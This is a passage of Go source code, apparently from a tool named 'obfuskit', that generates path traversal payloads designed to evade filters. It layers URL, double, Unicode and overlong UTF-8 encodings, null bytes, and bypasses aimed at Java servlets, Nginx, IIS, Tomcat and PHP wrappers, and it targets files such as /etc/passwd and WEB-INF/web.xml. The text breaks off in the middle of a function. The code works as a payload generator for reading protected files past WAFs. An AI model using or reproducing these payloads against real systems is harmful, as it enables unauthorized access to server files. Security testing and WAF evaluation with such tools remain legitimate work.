package path

import (
	"fmt"
	"math/rand"
	"obfuskit/constants"
	"obfuskit/internal/evasions"
	"strings"
)

// PathTraversalVariants generates various path traversal evasion techniques
// based on the specified obfuscation level
func PathTraversalVariants(path string, level constants.Level) []string {
	var variants []string

	// Safety function to catch panics in individual evasion functions
	safeApply := func(fn func(string) string, input string) string {
		defer func() {
			if r := recover(); r != nil {
				// Log the panic but don't crash
				// Return the original input as fallback
			}
		}()
		return fn(input)
	}

	safeApplyMultiple := func(fn func(string) []string, input string) []string {
		defer func() {
			if r := recover(); r != nil {
				// Return original input as fallback
			}
		}()
		return fn(input)
	}

	// Basic evasion techniques with safety wrapper
	variants = append(variants,
		safeApply(dotSlashPrepend, path),            // Adding ./ prefixes
		safeApply(dotSlashVarying, path),            // Varying ./ and ../
		safeApply(doubleSlashPadding, path),         // Using // instead of /
		safeApply(urlEncoding, path),                // Basic URL encoding
		safeApply(mixedEncoding, path),              // Mixed case and encoding
		safeApply(slashBackslashMix, path),          // Mixing / and \
		safeApply(redundantDots, path),              // Adding redundant dots in paths
		safeApply(caseVariation, path),              // Case variations where applicable
		safeApply(nonReadableDirPaths, path),        // Using non-readable directories
		safeApply(windowsAlternateStream, path),     // Windows alternate data stream syntax
		safeApply(unicodeCombiningCharacters, path), // Unicode combining characters
	)

	nullResults := safeApplyMultiple(nullByteInjection, path)
	variants = append(variants, nullResults...)

	// Return basic variants if level is Basic
	if level == constants.Basic {
		return evasions.UniqueStrings(variants)
	}

	// Medium level adds more complex techniques
	variants = append(variants,
		safeApply(doubleUrlEncoding, path),       // Double URL encoding
		safeApply(unicodeEncoding, path),         // Unicode encoding
		safeApply(pathNormalization, path),       // Path normalization tricks
		safeApply(selfReferencingDir, path),      // Using self-referencing directory
		safeApply(repetitiveTraversal, path),     // Repetitive directory traversal
		safeApply(environmentVarsInPath, path),   // Using environment variables
		safeApply(directoryAliasing, path),       // Using directory aliases
		safeApply(dotDotSeparation, path),        // Separating the dots in ../
		safeApply(htmlEntityEncoding, path),      // HTML entity encoding
		safeApply(multipleRepresentations, path), // Multiple character representations
		safeApply(encodedBackslash, path),        // Encoded backslashes
		safeApply(nestedEncoding, path),          // Nested encoding techniques
		safeApply(javaServletBypass, path),       // Java servlet bypass techniques
		safeApply(nginxOffBySlash, path),         // Nginx off-by-slash bypass
		safeApply(phpNullByteAlternate, path),    // PHP null byte alternatives
		safeApply(jspWebInfTraversal, path),      // JSP WEB-INF traversal
	)

	// Return medium variants if level is Medium
	if level == constants.Medium {
		return evasions.UniqueStrings(variants)
	}

	// Advanced level adds the most complex evasion techniques
	variants = append(variants,
		safeApply(hexEncodedPath, path),            // Using hex encoding for path segments
		safeApply(unicodeNormalization, path),      // Unicode normalization evasion
		safeApply(percentUtf8Encoding, path),       // Percent-encoding UTF-8 sequences
		safeApply(overLongUtf8, path),              // Over-long UTF-8 encoding
		safeApply(nonStandardCharset, path),        // Non-standard charset encoding
		safeApply(multiProtocolEvasion, path),      // Multiple protocol handlers
		safeApply(fragmentIdentifiers, path),       // Using fragment identifiers
		safeApply(parameterInjection, path),        // Parameter injection techniques
		safeApply(mixedTraversalTechniques, path),  // Mixed traversal techniques
		safeApply(symbolLinkBased, path),           // Symbolic link based techniques
		safeApply(stackedEncodingLayers, path),     // Multiple stacked encoding layers
		safeApply(iisBackslashTrick, path),         // IIS backslash/dot trick
		safeApply(apacheMultiViewBypass, path),     // Apache MultiViews bypass
		safeApply(tomcatBypass, path),              // Tomcat specific bypass techniques
		safeApply(unicodeWidthAndDirection, path),  // Unicode width variation
		safeApply(httpHeaderFilePath, path),        // HTTP header file path injection
		safeApply(urlEncodedBackslashAtSign, path), // URL encoded backslash @ sign
		safeApply(nonstandardEncoding, path),       // Non-standard encoding formats
		safeApply(controlCharacterInjection, path), // Control character injection
		safeApply(pathParameterConfusion, path),    // Path parameter confusion
	)

	return evasions.UniqueStrings(variants)
}

// Basic evasion techniques

func dotSlashPrepend(path string) string {
	// Add ./ at the beginning
	return "./" + path
}

func dotSlashVarying(path string) string {
	parts := strings.Split(path, "/")
	result := ""

	for i, part := range parts {
		if i > 0 {
			result += "/"
		}

		if part == ".." {
			if rand.Intn(2) == 0 {
				result += "./.."
			} else {
				result += part
			}
		} else if part != "" {
			if rand.Intn(3) == 0 {
				result += "./" + part
			} else {
				result += part
			}
		}
	}

	return result
}

func doubleSlashPadding(path string) string {
	// Replace single / with //
	return strings.ReplaceAll(path, "/", "//")
}

func urlEncoding(path string) string {
	parts := strings.Split(path, "/")
	result := ""

	for i, part := range parts {
		if i > 0 {
			result += "/"
		}

		if part == ".." {
			// Fully encode both dots
			result += "%2e%2e"
		} else if part != "" {
			// URL encode only some characters
			encoded := ""
			for _, c := range part {
				if rand.Intn(3) == 0 {
					encoded += fmt.Sprintf("%%%02x", c)
				} else {
					encoded += string(c)
				}
			}
			result += encoded
		}
	}

	return result
}

func mixedEncoding(path string) string {
	parts := strings.Split(path, "/")
	result := ""

	for i, part := range parts {
		if i > 0 {
			result += "/"
		}

		if part == ".." {
			// Mix upper and lowercase encoding - works in many parsers
			options := []string{
				"%2e%2E",
				"%2E%2e",
				"%2E%2E",
				"%2e%2e",
			}
			result += options[rand.Intn(len(options))]
		} else if part != "" {
			// Also encode parts of the path
			encoded := ""
			for _, c := range part {
				if rand.Intn(4) == 0 {
					encoded += fmt.Sprintf("%%%02X", c) // Uppercase hex
				} else if rand.Intn(3) == 0 {
					encoded += fmt.Sprintf("%%%02x", c) // Lowercase hex
				} else {
					encoded += string(c)
				}
			}
			result += encoded
		}
	}

	return result
}

func slashBackslashMix(path string) string {
	result := ""
	for _, c := range path {
		if c == '/' && rand.Intn(2) == 0 {
			result += "\\"
		} else {
			result += string(c)
		}
	}
	return result
}

func nullByteInjection(path string) []string {
	// Add null byte at the end for potential string termination issues
	// Works in many older systems, especially PHP < 5.3.4, Java and older C applications
	options := []string{
		path + "%00",
		path + "\x00",
		path + "%00.jpg", // Add fake extension after null byte
		path + "%00.png",
		path + "%00.pdf",
	}

	return options
}

func redundantDots(path string) string {
	parts := strings.Split(path, "/")
	result := ""

	for i, part := range parts {
		if i > 0 {
			result += "/"
		}

		if part == ".." {
			// Add redundant dots that may be normalized
			options := []string{
				"...",    // Three dots
				"....",   // Four dots
				".....",  // Five dots
				"......", // Six dots
			}
			result += options[rand.Intn(len(options))]
		} else if part != "" {
			// Also potentially modify normal parts
			if rand.Intn(5) == 0 && !strings.Contains(part, ".") {
				result += part + "." // Add trailing dot
			} else {
				result += part
			}
		}
	}

	return result
}

func caseVariation(path string) string {
	// Change case for characters in the path
	// Most effective on Windows systems that are case-insensitive
	result := ""
	for _, c := range path {
		if (c >= 'a' && c <= 'z') && rand.Intn(2) == 0 {
			result += strings.ToUpper(string(c))
		} else if (c >= 'A' && c <= 'Z') && rand.Intn(2) == 0 {
			result += strings.ToLower(string(c))
		} else {
			result += string(c)
		}
	}
	return result
}

func nonReadableDirPaths(path string) string {
	// Insert non-readable directory references (such as /./), which get normalized
	parts := strings.Split(path, "/")
	result := ""

	for i, part := range parts {
		if i > 0 {
			options := []string{
				"/./",   // Regular current directory reference
				"/././", // Multiple current directory references
				"/.//",  // Current dir with double slash
				"/.",    // Current dir without trailing slash
			}

			if rand.Intn(3) == 0 {
				result += options[rand.Intn(len(options))]
			} else {
				result += "/"
			}
		}

		result += part
	}

	return result
}

func windowsAlternateStream(path string) string {
	// Windows NTFS alternate data streams syntax - often overlooked by filters
	// Format: filename:streamname

	// Get filename part
	parts := strings.Split(path, "/")
	if len(parts) < 1 {
		return path
	}

	filename := parts[len(parts)-1]
	prefix := strings.TrimSuffix(path, filename)

	streams := []string{
		":$DATA",             // Standard data stream
		":stream",            // Custom stream name
		":alternate",         // Another custom stream
		":$INDEX_ALLOCATION", // Index allocation stream
	}

	// Append alternate data stream syntax
	return prefix + filename + streams[rand.Intn(len(streams))]
}

func unicodeCombiningCharacters(path string) string {
	// Use Unicode combining characters to obfuscate path components
	parts := strings.Split(path, "/")
	result := ""

	for i, part := range parts {
		if i > 0 {
			result += "/"
		}

		if part == ".." {
			// Add combining character after each dot
			result += ".\u0307.\u0307" // Dot with dot above combining character
		} else if part != "" {
			// Potentially add combining characters to regular parts
			encoded := ""
			for _, c := range part {
				encoded += string(c)
				// Randomly add a combining character
				if rand.Intn(5) == 0 {
					combiningChars := []string{
						"\u0301", // Combining acute accent
						"\u0307", // Combining dot above
						"\u0308", // Combining diaeresis
					}
					encoded += combiningChars[rand.Intn(len(combiningChars))]
				}
			}
			result += encoded
		}
	}

	return result
}

// Medium evasion techniques

func doubleUrlEncoding(path string) string {
	parts := strings.Split(path, "/")
	result := ""

	for i, part := range parts {
		if i > 0 {
			// Also sometimes double-encode the slash
			if rand.Intn(3) == 0 {
				result += "%252f"
			} else {
				result += "/"
			}
		}

		if part == ".." {
			// Double URL encode dots - effective against some WAFs and filters
			options := []string{
				"%252e%252e",
				"%252E%252E",
				"%252e%252E",
				"%252E%252e",
			}
			result += options[rand.Intn(len(options))]
		} else if part != "" {
			// Double encode parts of the path
			encoded := ""
			for _, c := range part {
				if rand.Intn(3) == 0 {
					encoded += fmt.Sprintf("%%25%02x", c)
				} else {
					encoded += string(c)
				}
			}
			result += encoded
		}
	}

	return result
}

func unicodeEncoding(path string) string {
	parts := strings.Split(path, "/")
	result := ""

	for i, part := range parts {
		if i > 0 {
			if rand.Intn(3) == 0 {
				// Unicode encode forward slash
				result += "%u002f"
			} else {
				result += "/"
			}
		}

		if part == ".." {
			// Unicode encoding for dots - bypasses some filters
			options := []string{
				"%u002e%u002e", // Basic unicode encoding
				"%u002E%u002E",
				"%u00ae",       // Unicode registered sign that might get normalized
				"\u2024\u2024", // One dot leader character
			}
			result += options[rand.Intn(len(options))]
		} else if part != "" {
			// Unicode encode parts of the path
			encoded := ""
			for _, c := range part {
				if rand.Intn(3) == 0 && c < 127 {
					encoded += fmt.Sprintf("%%u%04x", c)
				} else {
					encoded += string(c)
				}
			}
			result += encoded
		}
	}

	return result
}

func pathNormalization(path string) string {
	parts := strings.Split(path, "/")
	result := ""

	for i, part := range parts {
		if i > 0 {
			result += "/"
		}

		if part == ".." {
			// Insert something that gets normalized away
			options := []string{
				"../x/../..",         // Navigate into x then back out with .. and up another level
				"../././..",          // Navigate up, then current dir twice, then up again
				"../abc/../def/./..", // More complex normalization scenario
				"../test/../../",     // Navigate up, into folder, then back up two levels
			}
			result += options[rand.Intn(len(options))]
		} else if part != "" {
			// Sometimes insert normalization patterns in regular parts too
			if rand.Intn(4) == 0 {
				result += "./" + part + "/."
			} else {
				result += part
			}
		}
	}

	return result
}

func selfReferencingDir(path string) string {
	parts := strings.Split(path, "/")
	result := ""

	for i, part := range parts {
		if i > 0 {
			result += "/"
		}

		if part == ".." {
			// Use self-referencing directory patterns
			options := []string{
				".",       // Single dot to represent current directory
				"./.",     // Double reference to current directory
				"./././.", // Multiple references to current directory
				".",       // Single current directory reference
			}
			result += options[rand.Intn(len(options))] + part
		} else if part != "" {
			result += part
		}
	}

	return result
}

func repetitiveTraversal(path string) string {
	parts := strings.Split(path, "/")
	result := ""

	for i, part := range parts {
		if i > 0 {
			result += "/"
		}

		if part == ".." {
			// Add redundant traversal that cancels out
			// This works because many path normalizers process these sequentially
			patterns := []string{
				"../x/..", // Go up, into x, then back up - net effect is one level up
				"../abc/../",
				"../test/../",
				"../temp/../",
				"../dir1/dir2/../../", // Go up, then into nested dirs, then back up twice
			}
			result += patterns[rand.Intn(len(patterns))]
		} else if part != "" {
			result += part
		}
	}

	return result
}

func environmentVarsInPath(path string) string {
	// Use environment variables to construct part of the path
	// This works in many systems that expand environment variables

	if strings.Contains(path, "etc/passwd") {
		envVars := []string{
			"${HOME}/../../../etc/passwd",
			"${DOCUMENT_ROOT}/../../etc/passwd",
			"${USER_DIR}/../../../etc/passwd",
			"${SYSTEMROOT}/../../../etc/passwd",
			"%SYSTEMROOT%\\..\\..\\..\\etc\\passwd", // Windows style
		}
		return envVars[rand.Intn(len(envVars))]
	} else if strings.Contains(path, "etc") {
		// Safe split with bounds checking
		parts := strings.Split(path, "etc/")
		base := ""
		if len(parts) > 1 {
			base = parts[1]
		} else {
			base = "passwd" // Default fallback
		}
		envVars := []string{
			"${PWD}/../../../etc/" + base,
			"${DOCUMENT_ROOT}/../../etc/" + base,
			"${SYSTEMROOT}/../../../etc/" + base,
			"%SYSTEMROOT%\\..\\..\\..\\etc\\" + strings.ReplaceAll(base, "/", "\\"), // Windows style
		}
		return envVars[rand.Intn(len(envVars))]
	}

	// Generic environment variable substitution
	envVars := []string{
		"${OLDPWD}/" + path,
		"${HOME}/" + path,
		"${PWD}/" + path,
		"%USERPROFILE%\\" + strings.ReplaceAll(path, "/", "\\"), // Windows style
	}
	return envVars[rand.Intn(len(envVars))]
}

func directoryAliasing(path string) string {
	// Use directory aliases like ~ for /home/user
	// This works because many systems resolve these aliases before security checks

	aliases := []string{
		"~/../" + strings.TrimPrefix(path, "../"),     // Home directory alias
		"$HOME/../" + strings.TrimPrefix(path, "../"), // Environment variable
		".//" + path, // Double slash after current dir
		"./../" + strings.TrimPrefix(path, "../"), // Current directory then up
	}

	return aliases[rand.Intn(len(aliases))]
}

func dotDotSeparation(path string) string {
	parts := strings.Split(path, "/")
	result := ""

	for i, part := range parts {
		if i > 0 {
			result += "/"
		}

		if part == ".." {
			// Separate the dots with something that gets ignored
			// These work in systems that normalize certain characters between dots
			options := []string{
				".\\.",  // Backslash between dots
				".%09.", // Tab character between dots
				".%0D.", // Carriage return between dots
				".%0A.", // Line feed between dots
				".%20.", // Space between dots
				".%2F.", // Forward slash between dots - gets normalized in some parsers
				".%5C.", // Backslash between dots - gets normalized in some parsers
				".\t.",  // Literal tab character
				". .",   // Literal space
			}
			result += options[rand.Intn(len(options))]
		} else if part != "" {
			result += part
		}
	}

	return result
}

func htmlEntityEncoding(path string) string {
	parts := strings.Split(path, "/")
	result := ""

	for i, part := range parts {
		if i > 0 {
			// Encode slash using HTML entity - works in some contexts that decode HTML
			options := []string{
				"&#47;",   // Decimal HTML entity
				"&#x2F;",  // Hex HTML entity
				"&#047;",  // Leading zero decimal
				"&#x02F;", // Leading zero hex
				"/",       // Plain slash
			}
			result += options[rand.Intn(len(options))]
		}

		if part == ".." {
			// HTML entity encode the dots
			options := []string{
				"&#46;&#46;",     // Decimal HTML entity
				"&#x2E;&#x2E;",   // Hex HTML entity
				"&#046;&#046;",   // Leading zero decimal
				"&#x02E;&#x02E;", // Leading zero hex
			}
			result += options[rand.Intn(len(options))]
		} else if part != "" {
			encoded := ""
			for _, c := range part {
				if rand.Intn(3) == 0 {
					// Mix decimal and hex encoding randomly
					if rand.Intn(2) == 0 {
						encoded += fmt.Sprintf("&#%d;", c) // Decimal
					} else {
						encoded += fmt.Sprintf("&#x%x;", c) // Hex
					}
				} else {
					encoded += string(c)
				}
			}
			result += encoded
		}
	}

	return result
}

func multipleRepresentations(path string) string {
	parts := strings.Split(path, "/")
	result := ""

	for i, part := range parts {
		if i > 0 {
			result += "/"
		}

		if part == ".." {
			// Different representations of .. that get normalized
			options := []string{
				"%2e%2e",     // URL encoded
				".%2e",       // Half URL encoded
				"%2e.",       // Half URL encoded (other half)
				"%252e%252e", // Double URL encoded
				"..;",        // Path parameter separator
				"..#",        // Fragment identifier
				"..%00",      // Null byte injection
				"..%20",      // Space after dots
				".%252e",     // Mixed encoding
				"%2e%252e",   // Mixed encoding
				"..\r",       // Carriage return
				"..\n",       // Line feed
				"..\t",       // Tab
			}
			result += options[rand.Intn(len(options))]
		} else if part != "" {
			result += part
		}
	}

	return result
}

func encodedBackslash(path string) string {
	// Replace forward slashes with encoded backslashes
	// Works in Windows-based systems and some URL parsers

	parts := strings.Split(path, "/")
	result := ""

	for i, part := range parts {
		if i > 0 {
			// Encoded backslash instead of forward slash
			options := []string{
				"%5c",   // URL encoded backslash
				"%5C",   // Uppercase URL encoded backslash
				"%255c", // Double encoded backslash
				"%255C", // Double encoded uppercase backslash
				"\\",    // Literal backslash
			}
			result += options[rand.Intn(len(options))]
		}

		result += part
	}

	return result
}

func nestedEncoding(path string) string {
	// Apply nested encoding to different parts selectively
	parts := strings.Split(path, "/")
	result := ""

	for i, part := range parts {
		if i > 0 {
			result += "/"
		}

		if part == ".." {
			// Complex nested encoding of double dots
			options := []string{
				// First dot normal, second encoded
				".%2e",
				// First dot encoded, second normal
				"%2e.",
				// First dot encoded, second double encoded
				"%2e%252e",
				// First dot double encoded, second normal
				"%252e.",
				// Mixed case encoding
				"%2e%2E",
				"%2E%2e",
			}
			result += options[rand.Intn(len(options))]
		} else if part != "" {
			// Selectively encode parts of the path
			encoded := ""
			for _, c := range part {
				// Choose a random encoding level for each character
				encodingLevel := rand.Intn(4)
				switch encodingLevel {
				case 0:
					encoded += string(c) // No encoding
				case 1:
					encoded += fmt.Sprintf("%%%02x", c) // Single URL encoding
				case 2:
					encoded += fmt.Sprintf("%%25%02x", c) // Double URL encoding
				case 3:
					if c < 128 {
						encoded += fmt.Sprintf("%%u00%02x", c) // Unicode encoding
					} else {
						encoded += string(c)
					}
				}
			}
			result += encoded
		}
	}

	return result
}

func javaServletBypass(path string) string {
	// Specific evasion techniques for Java servlets
	// These techniques exploit normalization quirks in Java web containers

	if strings.Contains(path, "../") {
		options := []string{
			strings.ReplaceAll(path, "../", "..;/"),        // Path parameter trick
			strings.ReplaceAll(path, "../", "..//"),        // Double slash
			strings.ReplaceAll(path, "../", "../././"),     // Current directory insertion
			strings.ReplaceAll(path, "../", "%252e%252e/"), // Double URL encoding
			strings.ReplaceAll(path, "../", "%252e%252e/"), // Double URL encoding
			strings.ReplaceAll(path, "../", "..%c0%af"),    // Overlong UTF-8 encoding of slash
		}
		return options[rand.Intn(len(options))]
	}

	return path
}

func nginxOffBySlash(path string) string {
	// Nginx off-by-slash bypass technique
	// This exploits normalization behaviors in Nginx

	// First check if this is a suitable path for this technique
	if !strings.Contains(path, "../") {
		return path
	}

	options := []string{
		// Double forward slash variations
		strings.ReplaceAll(path, "../", "..//"),
		// Mixed slash variations
		strings.ReplaceAll(path, "../", "../\\"),
		// Encoded slash variations
		strings.ReplaceAll(path, "../", "../%2f"),
		// Slash with parameter
		strings.ReplaceAll(path, "../", "../;/"),
		// Slash with unescaped space
		strings.ReplaceAll(path, "../", "../ /"),
	}

	return options[rand.Intn(len(options))]
}

func phpNullByteAlternate(path string) string {
	// PHP-specific null byte and alternate techniques
	// These work on older PHP versions or when PHP interacts with C libraries

	// Don't apply to every path
	if rand.Intn(2) == 0 {
		return path
	}

	options := []string{
		// Standard null byte injection
		path + "%00",
		// Standard null byte with fake file extension
		path + "%00.jpg",
		path + "%00.png",
		path + "%00.gif",
		// Alternate encodings of null byte
		path + "%2500", // Double encoded null byte
		path + "\x00",  // Literal null byte (may not work in all contexts)
		// PHP truncation trick with long strings
		path + strings.Repeat("A", 2048), // Very long string may trigger truncation
	}

	return options[rand.Intn(len(options))]
}

func jspWebInfTraversal(path string) string {
	// JSP WEB-INF directory traversal technique
	// Target the WEB-INF directory which is protected in Java web apps

	// Check if this looks like a Java web app path
	if strings.Contains(path, ".jsp") || strings.Contains(path, "servlet") ||
		strings.Contains(path, "WEB-INF") || strings.Contains(path, "web.xml") {

		options := []string{
			// Various WEB-INF traversal techniques
			"/WEB-INF/web.xml",
			"/%2e/WEB-INF/web.xml",
			"/blah/WEB-INF/web.xml",
			"/WEB-INF/./web.xml",
			"/./WEB-INF/web.xml",
			"/WEB-INF/classes/config.properties",
			"../../WEB-INF/web.xml",
			"..%252f..%252fWEB-INF/web.xml",
		}

		return options[rand.Intn(len(options))]
	}

	return path
}

// Advanced evasion techniques

func hexEncodedPath(path string) string {
	// Convert entire path segments to hex representation
	parts := strings.Split(path, "/")
	result := ""

	for i, part := range parts {
		if i > 0 {
			// Even the slashes can be hex encoded
			if rand.Intn(3) == 0 {
				result += "\\x2f"
			} else {
				result += "/"
			}
		}

		if part != "" {
			// Full hex encoding of path segment
			encoded := ""
			for _, c := range part {
				// Mix different hex formats
				format := rand.Intn(3)
				if format == 0 {
					encoded += fmt.Sprintf("\\x%02x", c) // Lowercase hex
				} else if format == 1 {
					encoded += fmt.Sprintf("\\x%02X", c) // Uppercase hex
				} else {
					encoded += fmt.Sprintf("\\%03o", c) // Octal encoding
				}
			}
			result += encoded
		}
	}

	return result
}

func unicodeNormalization(path string) string {
	// Use Unicode normalization form variations to bypass filters
	parts := strings.Split(path, "/")
	result := ""

	for i, part := range parts {
		if i > 0 {
			result += "/"
		}

		if part == ".." {
			// Use combining characters and alternative Unicode representations
			options := []string{
				".\u0323.",       // Dot with combining dot below
				".\u0307.",       // Dot with combining dot above
				".\u0323\u0307.", // Dot with multiple combining characters
				"\u2024\u2024",   // One dot leader character
				"\uFF0E\uFF0E",   // Fullwidth dot
				"\u2024\uFF0E",   // Mixed Unicode dots
			}
			result += options[rand.Intn(len(options))]
		} else if part != "" {
			// Use Unicode normalization on normal path parts too
			encoded := ""
			for _, c := range part {
				if rand.Intn(5) == 0 && c < 127 {
					// Use Unicode variations that normalize to ASCII
					switch c {
					case 'a':
						encoded += "\u00e0" // à - normalizes to 'a' in some systems
					case 'e':
						encoded += "\u00e9" // é - normalizes to 'e' in some systems
					case 'i':
						encoded += "\u00ed" // í - normalizes to 'i' in some systems
					case 'o':
						encoded += "\u00f3" // ó - normalizes to 'o' in some systems
					case 'u':
						encoded += "\u00fa" // ú - normalizes to 'u' in some systems
					case 's':
						encoded += "\u0161" // š - normalizes to 's' in some systems
					default:
						encoded += string(c)
					}
				} else {
					encoded += string(c)
				}
			}
			result += encoded
		}
	}

	return result
}

func percentUtf8Encoding(path string) string {
	parts := strings.Split(path, "/")
	result := ""

	for i, part := range parts {
		if i > 0 {
			// UTF-8 encode the slash sometimes
			if rand.Intn(3) == 0 {
				result += "%c0%af" // Overlong UTF-8 encoding of /
			} else {
				result += "/"
			}
		}

		if part == ".." {
			// UTF-8 encoding of dots - these work in many legacy systems
			options := []string{
				"%c0%ae%c0%ae",             // Overlong UTF-8 encoding
				"%e0%80%ae%e0%80%ae",       // Even longer UTF-8 encoding
				"%f0%80%80%ae%f0%80%80%ae", // UTF-8 encoding with more bytes
				"%c0%2e%c0%2e",             // Mixed encoding
				"%c0%ae.%c0%ae",            // First dot normal, second overlong
			}
			result += options[rand.Intn(len(options))]
		} else if part != "" {
			// Maybe UTF-8 encode some characters in the path
			encoded := ""
			for _, c := range part {
				if c < 128 && rand.Intn(5) == 0 {
					// Overlong UTF-8 encoding tricks
					encoded += fmt.Sprintf("%%c0%%%x", c+128)
				} else {
					encoded += string(c)
				}
			}
			result += encoded
		}
	}

	return result
}

func overLongUtf8(path string) string {
	// Overlong UTF-8 encoding - works on systems that don't validate UTF-8 properly
	parts := strings.Split(path, "/")
	result := ""

	for i, part := range parts {
		if i > 0 {
			// UTF-8 overlong slash
			options := []string{
				"%c0%af",       // 2-byte overlong
				"%e0%80%af",    // 3-byte overlong
				"%f0%80%80%af", // 4-byte overlong
				"/",            // Normal slash occasionally to mix things up
			}
			result += options[rand.Intn(len(options))]
		}

		if part == ".." {
			// UTF-8 overlong encoding of dots with varying lengths
			options := []string{
				"%c0%ae%c0%ae",             // 2-byte overlong
				"%e0%80%ae%e0%80%ae",       // 3-byte overlong
				"%f0%80%80%ae%f0%80%80%ae", // 4-byte overlong
				// Mix different lengths
				"%c0%ae%e0%80%ae",
				"%e0%80%ae%c0%ae",
			}
			result += options[rand.Intn(len(options))]
		} else if part != "" {
			result += part
		}
	}

	return result
}

func nonStandardCharset(path string) string {
	// Use non-standard charset encodings
	if strings.Contains(path, "../") {
		options := []string{
			strings.ReplaceAll(path, "../", "..%FE"),          // Invalid continuation byte
			strings.ReplaceAll(path, "../", "..%C1"),          // Invalid UTF-8 lead byte
			strings.ReplaceAll(path, "../", "..%F5"),          // Invalid UTF-8 lead byte (outside Unicode range)
			strings.ReplaceAll(path, "../", "..%F0%9F%92%A9"), // Unicode poop emoji - might crash parsers
			strings.ReplaceAll(path, "../", "..%EF%BB%BF"),    // UTF-8 BOM (byte order mark)
			strings.ReplaceAll(path, "../", "..%ED%A0%80"),    // UTF-16 surrogate
		}
		return options[rand.Intn(len(options))]
	}
	return path
}

func multiProtocolEvasion(path string) string {
	// Add fake protocol handler - effective against many URL parsers
	protocols := []string{
		"file:///",         // Basic file protocol
		"jar:file:///",     // Java JAR protocol wrapper
		"jar:jar:file:///", // Double JAR wrapper
		"zip:file:///",     // ZIP protocol
		"data:text/plain,", // Data URI protocol
		"netdoc:///",       // Legacy Java netdoc protocol
		"gopher://",        // Gopher protocol
		"expect://",        // Expect protocol (can be dangerous)
		"dict://",          // Dictionary protocol
		"ldap://",          // LDAP protocol
		"smtp://",          // SMTP protocol
		"file:\\\\\\",      // Windows UNC file path style
		"php://filter/",    // PHP filter wrapper
		"phar://",          // PHP Phar wrapper
		"zip://",           // PHP ZIP wrapper
	}

	// Don't always add a protocol - mix normal and protocol forms
	if rand.Intn(3) == 0 {
		return path // Return normal path sometimes
	}

	protocol := protocols[rand.Intn(len(protocols))]

	// Handle path prefix properly
	trimmedPath := path
	if strings.HasPrefix(path, "/") {
		trimmedPath = strings.TrimPrefix(path, "/")
	}

	return protocol + trimmedPath
}

func fragmentIdentifiers(path string) string {
	// Add fragment identifiers to confuse parsers
	parts := strings.Split(path, "/")
	result := ""

	for i, part := range parts {
		if i > 0 {
			result += "/"
		}

		if part != "" {
			// Add fragment identifiers at different positions
			switch rand.Intn(5) {
			case 0:
				// Fragment after part
				result += part + "#" + randomString(3)
			case 1:
				// Fragment before & after
				result += "#" + randomString(2) + part + "#" + randomString(3)
			case 2:
				// Fragment in the middle of part
				if len(part) > 2 {
					midPoint := len(part) / 2
					result += part[:midPoint] + "#" + randomString(2) + part[midPoint:]
				} else {
					result += part
				}
			case 3:
				// Multiple fragments
				result += part + "#" + randomString(2) + "#" + randomString(3)
			default:
				result += part
			}
		}
	}

	return result
}

func randomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	result := ""
	for i := 0; i < length; i++ {
		result += string(charset[rand.Intn(len(charset))])
	}
	return result
}

func parameterInjection(path string) string {
	// Add URL parameters to confuse parsers
	// Many systems treat parameters differently in path normalization

	// Parameter injection variations
	options := []string{
		// Basic parameter
		path + "?x=" + randomString(5),
		// Multiple parameters
		path + "?x=" + randomString(3) + "&y=" + randomString(4),
		// Parameter in the middle of path
		insertParameter(path),
		// Path segment parameter (;)
		insertPathParameter(path),
		// Parameter with special chars
		path + "?_" + randomString(3) + "=" + randomString(5) + "%20" + randomString(2),
		// Parameter with encoded values
		path + "?q=%22" + randomString(5) + "%22",
	}

	return options[rand.Intn(len(options))]
}

func insertParameter(path string) string {
	// Insert parameter in the middle of the path
	parts := strings.Split(path, "/")
	if len(parts) <= 2 {
		return path + "?x=" + randomString(5)
	}

	// Choose a random position to insert the parameter
	position := 1 + rand.Intn(len(parts)-1)

	result := ""
	for i, part := range parts {
		if i > 0 {
			result += "/"
		}

		result += part

		// Insert parameter at the chosen position
		if i == position {
			result += "?x=" + randomString(5)
		}
	}

	return result
}

func insertPathParameter(path string) string {
	// Insert path parameter using semicolon
	parts := strings.Split(path, "/")
	result := ""

	for i, part := range parts {
		if i > 0 {
			result += "/"
		}

		if part != "" && rand.Intn(3) == 0 {
			// Add path parameter with semicolon
			result += part + ";" + randomString(3) + "=" + randomString(5)
		} else {
			result += part
		}
	}

	return result
}

func mixedTraversalTechniques(path string) string {
	// Combine multiple techniques for maximum effectiveness
	result := path

	// Apply 2-3 random transformations
	transformCount := 2 + rand.Intn(2)

	// Pool of effective transformations
	transformations := []func(string) string{
		urlEncoding,
		slashBackslashMix,
		doubleSlashPadding,
		dotDotSeparation,
		unicodeEncoding,
		percentUtf8Encoding,
	}

	// Track used transformations to avoid duplicates
	usedTransforms := make(map[int]bool)

	for i := 0; i < transformCount; i++ {
		// Choose a random transformation that hasn't been used yet
		var transformIndex int
		for {
			transformIndex = rand.Intn(len(transformations))
			if !usedTransforms[transformIndex] {
				usedTransforms[transformIndex] = true
				break
			}

			// If we've used all transformations, break
			if len(usedTransforms) == len(transformations) {
				break
			}
		}

		// Apply the transformation
		result = transformations[transformIndex](result)
	}

	// add nullbyte injection -
	results := nullByteInjection(result)
	return results[rand.Intn(len(results))]
}

func symbolLinkBased(path string) string {
	// Simulates symbolic link based traversal techniques
	// These work on systems that follow symlinks before security checks

	options := []string{
		// Common virtual paths that might be symlinked
		"/dev/null/../" + path,
		"/proc/self/cwd/" + strings.TrimPrefix(path, "../"),
		"/proc/self/root/" + strings.TrimPrefix(path, "../"),
		"/etc/passwd/../../" + path,
		"/var/www/html/uploads/symlink/../../../" + path,
		"/tmp/symlink/../" + path,
		"C:\\Windows\\system32\\..\\..\\..\\..\\" + strings.ReplaceAll(path, "/", "\\"),
	}

	return options[rand.Intn(len(options))]
}

func stackedEncodingLayers(path string) string {
	// Apply multiple layers of encoding - extremely effective against WAFs
	result := path

	// Define different encoding layers
	encodings := []func(string) string{
		urlEncoding,         // Basic URL encoding
		doubleUrlEncoding,   // Double URL encoding
		unicodeEncoding,     // Unicode encoding
		nestedEncoding,      // Nested encoding with mixed formats
		percentUtf8Encoding, // UTF-8 percent encoding
	}

	// Apply 2-4 random encoding layers
	layers := 2 + rand.Intn(3)

	// Track used encoding methods to get a good mix
	usedEncodings := make(map[int]bool)

	for i := 0; i < layers; i++ {
		// Choose a random encoding method that hasn't been used yet
		var encodingIndex int
		for {
			encodingIndex = rand.Intn(len(encodings))
			if !usedEncodings[encodingIndex] {
